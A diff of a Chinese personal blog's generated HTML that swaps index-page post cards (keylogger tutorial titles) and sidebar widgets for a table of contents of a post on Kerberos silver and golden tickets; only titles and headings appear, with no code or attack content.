-      <p><img src="https://i.loli.net/2021/04/25/fEPYvs6iTLcd3kV.gif" class="lazyload" data-srcset="https://i.loli.net/2021/04/25/fEPYvs6iTLcd3kV.gif" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="Alex-Green-Folio-Art-Illustration-Prey-scaled"></p>
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time>2019-08-01</time>
-        
-          <span class="dot"></span>
-          <a class="category-link" href="/categories/python/">python</a>
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2019/08/01/%E5%BB%BA%E7%AB%8B%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95%E5%99%A8part2/'>
-            阅读全文
-          </a>
-        </div>
-      
-    </div>
-  
-
-</div>
-
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow">
-  
-  
-  
-  
-    
-    <h2 class="article-title" >
-      <a href="/2019/07/20/%E5%BB%BA%E7%AB%8B%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95%E5%99%A8part1/">
-        建立键盘记录器part1
-      </a>
-    </h2>
-  
-  <div class='md'>
-    
-      <p><img src="https://i.loli.net/2021/04/25/RiOor59BNuzKmH4.jpg" class="lazyload" data-srcset="https://i.loli.net/2021/04/25/RiOor59BNuzKmH4.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="Alex-Green-Folio-Art-Illustration-Essential-Wine-Guide-Portugal-"></p>
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time>2019-07-20</time>
-        
-          <span class="dot"></span>
-          <a class="category-link" href="/categories/python/">python</a>
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2019/07/20/%E5%BB%BA%E7%AB%8B%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95%E5%99%A8part1/'>
-            阅读全文
-          </a>
-        </div>
-      
-    </div>
-  
-
-</div>
-
-          </div>
-        
-      
-    
-  </section>
-  
-    
   
 
 
-    
-  
+
+
+
+
 </div>
 <aside class='l_side'>
   
@@ -561,113 +535,22 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     
     
 
-<section class="widget blogger shadow desktop mobile">
-  <div class='content'>
-    
-      
-        <a class='avatar flat-box rectangle' href='/about/'>
-          <img no-lazy src='https://i.loli.net/2021/04/28/216QBFqc7OVsxAa.png'/>
-        </a>
-      
-    
-    
-      <div class='text'>
-        
-        
-          <p>秋风瑟瑟,落叶归零</p>
 
-        
-        
-      </div>
-    
-    
-      <div class="social-wrapper">
-        
-          
-            <a href="https://github.com/yui77111/"
-              class="social fab fa-github flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="/"
-              class="social fas fa-headphones-alt flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-      </div>
-    
-  </div>
-</section>
 
-  
-
-  
-    
-    
-  
-
-  <section class="widget category shadow desktop">
+  <section class="widget toc-wrapper shadow desktop mobile" id="toc-div" >
     
   <header>
     
-      <a href='/blog/categories/'><i class="fas fa-folder-open fa-fw" aria-hidden="true"></i><span class='name'>文章分类</span></a>
+      <i class="fas fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
     
   </header>
 
 
     <div class='content'>
-      <ul class="entry navigation">
-        
-          <li><a class="flat-box"
-            title="/categories/python/" href="/categories/python/"
-            id="categoriespython"
-            ><div class='name'>python</div><div class='badge'>(6)</div></a></li>
-        
-          <li><a class="flat-box"
-            title="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"
-            id="categoriesE6B897E9808FE6B58BE8AF95"
-            ><div class='name'>渗透测试</div><div class='badge'>(3)</div></a></li>
-        
-          <li><a class="flat-box child"
-            title="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%9F%9F%E6%B8%97%E9%80%8F/" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%9F%9F%E6%B8%97%E9%80%8F/"
-            id="categoriesE6B897E9808FE6B58BE8AF95E59F9FE6B897E9808F"
-            ><div class='name'>域渗透</div><div class='badge'>(2)</div></a></li>
-        
-      </ul>
+        <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#kerberos%E8%AE%A4%E8%AF%81"><span class="toc-text">kerberos认证</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83"><span class="toc-text">环境</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE"><span class="toc-text">白银票据</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%89%B9%E7%82%B9"><span class="toc-text">特点</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B"><span class="toc-text">利用过程</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E5%88%97%E8%A1%A8"><span class="toc-text">服务列表</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="toc-text">黄金票据</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%89%B9%E7%82%B9-1"><span class="toc-text">特点</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B-1"><span class="toc-text">利用过程</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-text">参考</span></a></li></ol>
     </div>
   </section>
 
-
-  
-
-  
-    
-    
-  
-
-  <section class="widget tagcloud shadow desktop mobile">
-    
-  <header>
-    
-      <a href='/blog/tags/'><i class="fas fa-tags fa-fw" aria-hidden="true"></i><span class='name'>热门标签</span></a>
-    
-  </header>
-
-
-    <div class='content'>
-      <a href="/tags/cve/" style="font-size: 14px; color: #999">cve</a> <a href="/tags/push/" style="font-size: 14px; color: #999">push</a> <a href="/tags/python/" style="font-size: 24px; color: #555">python</a> <a href="/tags/%E5%9F%9F/" style="font-size: 19px; color: #777">域</a>
-    </div>
-  </section>
-
-
-  
 
   
 
@@ -681,8 +564,8 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
 <script>
   window.pdata={}
-  pdata.ispage=false;
-  pdata.postTitle="";
+  pdata.ispage=true;
+  pdata.postTitle="白银/黄金票据";
   pdata.commentPath="";
   pdata.commentPlaceholder="";
   // header 这里无论是否开启pjax都需要
